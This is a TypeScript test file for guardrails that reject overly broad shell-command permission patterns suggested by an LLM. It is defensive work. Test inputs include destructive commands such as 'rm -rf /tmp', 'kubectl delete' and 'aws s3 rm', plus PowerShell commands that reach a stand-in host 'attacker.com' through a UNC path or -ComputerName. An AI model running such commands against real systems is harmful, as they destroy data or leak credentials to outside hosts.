// electron/permission-pattern-guardrails.test.ts
import { describe, it, expect } from "vitest";

import type { CommandClassification } from "./permission-classification-contracts";
import { applyGuardrails } from "./permission-pattern-guardrails";

function candidate(partial: Partial<CommandClassification>): CommandClassification {
  return {
    explanation: "",
    category: "unknown",
    suggestedPattern: null,
    patternRationale: null,
    source: "llm",
    guardrailRuleId: null,
    ...partial,
  };
}

describe("applyGuardrails — G_COMPOUND", () => {
  it("nulls pattern when command contains a shell pipe AND ctx.isReadOnlyCommand is absent", () => {
    const input = candidate({ suggestedPattern: "ls *", patternRationale: "lists files" });
    const out = applyGuardrails("ls | grep foo", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.patternRationale).toBeNull();
    expect(out.guardrailRuleId).toBe("G_COMPOUND");
  });

  it("keeps pattern for non-compound command", () => {
    const input = candidate({
      suggestedPattern: "az repos list *",
      patternRationale: "lists repos",
      category: "readonly",
    });
    const out = applyGuardrails("az repos list --project foo", input);
    expect(out.suggestedPattern).toBe("az repos list *");
    expect(out.guardrailRuleId).toBeNull();
  });

  // Option B: relaxed for all-readonly segments.

  it("allows pipe when every segment is readonly", () => {
    const isReadOnly = (cmd: string) =>
      cmd.trim().startsWith("git log") || cmd.trim().startsWith("head");
    const input = candidate({
      suggestedPattern: "git log * | head *",
      category: "readonly",
    });
    const out = applyGuardrails("git log --oneline | head -20", input, {
      isReadOnlyCommand: isReadOnly,
    });
    expect(out.suggestedPattern).toBe("git log * | head *");
    expect(out.guardrailRuleId).toBeNull();
  });

  it("still rejects compound when any segment is not readonly", () => {
    const isReadOnly = (cmd: string) => cmd.trim().startsWith("git log");
    const input = candidate({
      suggestedPattern: "git log * | rm *",
      category: "writes",
    });
    const out = applyGuardrails("git log | rm -rf /tmp", input, {
      isReadOnlyCommand: isReadOnly,
    });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_COMPOUND");
  });

  it("always rejects subshell even when the inner command is readonly", () => {
    const input = candidate({ suggestedPattern: "echo $(pwd)", category: "readonly" });
    const out = applyGuardrails("echo $(pwd)", input, { isReadOnlyCommand: () => true });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_COMPOUND");
  });
});

describe("applyGuardrails — G_DENY_BINARY", () => {
  it("refuses to broaden rm", () => {
    const input = candidate({ suggestedPattern: "rm *", category: "destructive" });
    const out = applyGuardrails("rm file.txt", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_BINARY");
  });

  it("refuses to broaden PowerShell Stop-Process case-insensitively", () => {
    const input = candidate({ suggestedPattern: "Stop-Process -Id *", category: "destructive" });
    const out = applyGuardrails("stop-process -id 1234", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_BINARY");
  });

  it("allows safe binary", () => {
    const input = candidate({ suggestedPattern: "az repos list *", category: "readonly" });
    const out = applyGuardrails("az repos list --project foo", input);
    expect(out.suggestedPattern).toBe("az repos list *");
  });
});

describe("applyGuardrails — G_DENY_PAIR", () => {
  it("refuses to broaden git push", () => {
    const input = candidate({ suggestedPattern: "git push *", category: "writes" });
    const out = applyGuardrails("git push origin main --force", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_PAIR");
  });

  it("refuses to broaden kubectl delete", () => {
    const input = candidate({ suggestedPattern: "kubectl delete pod *" });
    const out = applyGuardrails("kubectl delete pod foo", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_PAIR");
  });

  it("refuses to broaden aws s3 rm (three-token form)", () => {
    const input = candidate({ suggestedPattern: "aws s3 rm *" });
    const out = applyGuardrails("aws s3 rm s3://bucket/key", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_PAIR");
  });

  it("keeps pattern for git log", () => {
    const input = candidate({ suggestedPattern: "git log *", category: "readonly" });
    const out = applyGuardrails("git log --all", input);
    expect(out.suggestedPattern).toBe("git log *");
  });
});

describe("applyGuardrails — category rules", () => {
  it("G_CATEGORY_DESTRUCTIVE nulls pattern", () => {
    const input = candidate({ suggestedPattern: "foo *", category: "destructive" });
    const out = applyGuardrails("foo bar", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_CATEGORY_DESTRUCTIVE");
  });

  it("G_CATEGORY_NETWORK nulls pattern (empty safe-network allowlist)", () => {
    const input = candidate({ suggestedPattern: "myfetch *", category: "network" });
    const out = applyGuardrails("myfetch https://x.com", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_CATEGORY_NETWORK");
  });

  it("safety inversion: readonly heuristic forces category=readonly (no pattern change)", () => {
    const input = candidate({
      suggestedPattern: "az repos list *",
      category: "writes", // LLM got it wrong
      patternRationale: "lists repos",
    });
    const isReadOnly = () => true;
    const out = applyGuardrails("az repos list --project foo", input, {
      isReadOnlyCommand: isReadOnly,
    });
    expect(out.category).toBe("readonly");
    expect(out.suggestedPattern).toBe("az repos list *");
  });

  it("safety inversion does NOT downgrade LLM's readonly claim", () => {
    const input = candidate({
      suggestedPattern: "weird-tool *",
      category: "readonly",
    });
    const isReadOnly = () => false;
    const out = applyGuardrails("weird-tool --flag", input, { isReadOnlyCommand: isReadOnly });
    expect(out.category).toBe("readonly");
  });
});

describe("applyGuardrails — pattern sanity", () => {
  it("G_FIRST_TOKEN_MISMATCH: LLM proposes sudo prefix for non-sudo command", () => {
    const input = candidate({
      suggestedPattern: "sudo az repos list *",
      category: "readonly",
    });
    const out = applyGuardrails("az repos list --project foo", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_FIRST_TOKEN_MISMATCH");
  });

  it("G_BARE_STAR: ls * is rejected (ls not in structured-CLI allowlist)", () => {
    const input = candidate({ suggestedPattern: "ls *", category: "readonly" });
    const out = applyGuardrails("ls -la", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_BARE_STAR");
  });

  it("G_BARE_STAR: az repos list * is allowed (3+ tokens, not bare-star)", () => {
    const input = candidate({ suggestedPattern: "az repos list *", category: "readonly" });
    const out = applyGuardrails("az repos list --project foo", input);
    expect(out.suggestedPattern).toBe("az repos list *");
  });

  it("G_BARE_STAR: az * is rejected even for structured-CLI binaries (bare-star, no intermediate token)", () => {
    const input = candidate({ suggestedPattern: "az *", category: "readonly" });
    const out = applyGuardrails("az repos list --project foo", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_BARE_STAR");
  });

  it("G_BARE_STAR: npm * is rejected (bare-star, no intermediate token)", () => {
    const input = candidate({ suggestedPattern: "npm *", category: "readonly" });
    const out = applyGuardrails("npm install", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_BARE_STAR");
  });

  it("G_BARE_STAR: ls * is allowed when isReadOnlyCommand confirms", () => {
    const input = candidate({ suggestedPattern: "ls *", category: "readonly" });
    const out = applyGuardrails("ls -la", input, { isReadOnlyCommand: () => true });
    expect(out.suggestedPattern).toBe("ls *");
  });

  it("G_BARE_STAR: ls * is still rejected without isReadOnlyCommand context", () => {
    const input = candidate({ suggestedPattern: "ls *", category: "readonly" });
    const out = applyGuardrails("ls -la", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_BARE_STAR");
  });

  it("G_PATTERN_MISMATCH: LLM proposes pattern that does not match command", () => {
    const input = candidate({
      suggestedPattern: "npm ci --foo",
      category: "writes",
    });
    const out = applyGuardrails("npm install", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_PATTERN_MISMATCH");
  });
});

describe("applyGuardrails — safety invariants", () => {
  it("G_DENY_BINARY blocks rm even if isReadOnlyCommand returns true", () => {
    // Pins the invariant: static rules can confirm safety (readonly) but
    // cannot bypass deny rules. A future guardrail reorder must not silently
    // let rm * through because isReadOnlyCommand was lying.
    const input = candidate({ suggestedPattern: "rm *", category: "readonly" });
    const out = applyGuardrails("rm file.txt", input, { isReadOnlyCommand: () => true });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_DENY_BINARY");
  });

  it("G_CATEGORY_DESTRUCTIVE fires before G_BARE_STAR", () => {
    // Both would nullify the pattern, but the telemetry ruleId must reflect
    // the category rejection, not the pattern-shape rejection. Ordering
    // guarantees the right signal gets logged.
    const input = candidate({ suggestedPattern: "mycmd *", category: "destructive" });
    const out = applyGuardrails("mycmd bar", input);
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_CATEGORY_DESTRUCTIVE");
  });
});

describe("applyGuardrails — G_REMOTE_AUTH", () => {
  it("nulls pattern for Get-Content with UNC path", () => {
    const input = candidate({ suggestedPattern: "Get-Content *", category: "readonly" });
    const out = applyGuardrails("Get-Content \\\\attacker.com\\share\\f", input, {
      shellMode: "powershell",
    });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_REMOTE_AUTH");
  });

  it("nulls pattern for Get-CimInstance with remote -ComputerName", () => {
    const input = candidate({ suggestedPattern: "Get-CimInstance *", category: "readonly" });
    const out = applyGuardrails(
      "Get-CimInstance -ComputerName attacker.com Win32_OperatingSystem",
      input,
      { shellMode: "powershell" },
    );
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_REMOTE_AUTH");
  });

  it("nulls pattern for -CimSession argument", () => {
    const input = candidate({ suggestedPattern: "Get-CimInstance *", category: "readonly" });
    const out = applyGuardrails("Get-CimInstance -CimSession $s Win32_OS", input, {
      shellMode: "powershell",
    });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_REMOTE_AUTH");
  });

  it("keeps pattern for Get-Content with local path", () => {
    const input = candidate({ suggestedPattern: "Get-Content *", category: "readonly" });
    const out = applyGuardrails("Get-Content C:\\temp\\foo.log", input, {
      shellMode: "powershell",
      isReadOnlyCommand: () => true,
    });
    expect(out.suggestedPattern).toBe("Get-Content *");
    expect(out.guardrailRuleId).toBeNull();
  });

  it("keeps pattern for Get-CimInstance with -ComputerName localhost", () => {
    const input = candidate({ suggestedPattern: "Get-CimInstance *", category: "readonly" });
    const out = applyGuardrails("Get-CimInstance -ComputerName localhost Win32_OS", input, {
      shellMode: "powershell",
      isReadOnlyCommand: () => true,
    });
    expect(out.suggestedPattern).toBe("Get-CimInstance *");
    expect(out.guardrailRuleId).toBeNull();
  });

  it("does not fire in bash mode (UNC is a Windows concept)", () => {
    const input = candidate({ suggestedPattern: "cat *", category: "readonly" });
    const out = applyGuardrails("cat \\\\foo\\bar", input, { shellMode: "bash" });
    expect(out.guardrailRuleId).toBe("G_BARE_STAR");
    expect(out.suggestedPattern).toBeNull();
  });

  it("G_REMOTE_AUTH fires before G_COMPOUND for -CimSession $s (dynamic-var ordering pin)", () => {
    // Ordering invariant: -CimSession $s has both a remote-auth vector AND a
    // dynamic variable ($s). Without the G_REMOTE_AUTH-before-G_COMPOUND order,
    // this would be classified as G_COMPOUND and lose its security audit signal.
    const input = candidate({ suggestedPattern: "Get-CimInstance *", category: "readonly" });
    const out = applyGuardrails("Get-CimInstance -CimSession $s Win32_OS", input, {
      shellMode: "powershell",
    });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_REMOTE_AUTH");
  });
});

describe("applyGuardrails — shellMode forwarding", () => {
  it("does NOT null PowerShell scriptblock via G_COMPOUND when shellMode is powershell", () => {
    // PowerShell mode: `(...)` is sub-expression boundary, `{...}` is
    // scriptblock. G_COMPOUND splits and verifies every segment is
    // readonly. If `ctx.shellMode` weren't forwarded into
    // splitShellSegments/isUnsafeShellSyntax, the bash gate would fire on
    // `(` and silently null the pattern — defeating the relaxation. Pins
    // the wiring.
    const input = candidate({
      suggestedPattern: 'if (Test-Path "X") { Get-ChildItem "X" }',
      category: "readonly",
    });
    const out = applyGuardrails('if (Test-Path "X") { Get-ChildItem "X" }', input, {
      // Coarse "everything in this scriptblock looks readonly" — sufficient
      // to keep G_COMPOUND from nulling the pattern.
      isReadOnlyCommand: () => true,
      shellMode: "powershell",
    });
    expect(out.guardrailRuleId).not.toBe("G_COMPOUND");
  });

  it("DOES null the same shape in bash mode (G_COMPOUND correctly fires)", () => {
    // Symmetric test: same input, bash mode. `(`, `{` trip unsafe-syntax.
    const input = candidate({
      suggestedPattern: 'if (Test-Path "X") { Get-ChildItem "X" }',
      category: "readonly",
    });
    const out = applyGuardrails('if (Test-Path "X") { Get-ChildItem "X" }', input, {
      shellMode: "bash",
    });
    expect(out.suggestedPattern).toBeNull();
    expect(out.guardrailRuleId).toBe("G_COMPOUND");
  });

  it("forwards shellMode into the G_PATTERN_MISMATCH check (PS backtick pattern + single-quoted value)", () => {
    // The G_PATTERN_MISMATCH guardrail calls matchesAllowPattern(command,
    // current.suggestedPattern). Without forwarding shellMode, a PowerShell
    // pattern using `` `$expand=* `` against a command using single-quoted
    // `'$expand=relations'` would mismatch (backtick not stripped → values
    // compare lexically). Pinning the wiring.
    const cmd = "az devops invoke --query-parameters '$expand=relations'";
    const pat = "az devops invoke --query-parameters `$expand=*";
    const input = candidate({ suggestedPattern: pat, category: "readonly" });
    const out = applyGuardrails(cmd, input, { shellMode: "powershell" });
    expect(out.guardrailRuleId).not.toBe("G_PATTERN_MISMATCH");
    expect(out.suggestedPattern).toBe(pat);
  });
});
